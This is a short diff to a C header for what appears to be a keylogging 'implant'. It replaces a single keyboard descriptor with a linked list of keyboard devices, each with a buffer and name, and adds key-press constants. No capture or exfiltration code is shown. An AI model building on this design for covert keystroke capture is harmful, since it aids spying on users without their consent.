@@ -20,6 +20,19 @@
 
 #include <sys/types.h>
 #include <stdint.h>
+#include <sys/queue.h>
+
+typedef struct keyboard_s keyboard_t;
+struct keyboard_s {
+    int fd;
+
+    char buffer[256];
+    char name[64];
+
+    TAILQ_ENTRY(keyboard_s) devices;
+};
+
+
 
 /*
     contains project settings, such as target
@@ -37,7 +50,8 @@ typedef struct implant_s {
 
     /* keyboard settings */
     char locale[20];
-    int *kb_fd;
+    TAILQ_HEAD(listhead, keyboard_s) kbd;
+
 } implant_t;
 
 
@@ -56,6 +70,10 @@ typedef struct implant_s {
     } while (0)
 #endif
 
+
+
+#define KEY_PRESSED 1
+#define KEY_RELEASED 0
 
 // opt.c
 int parse_user_input(int, char **, implant_t *);
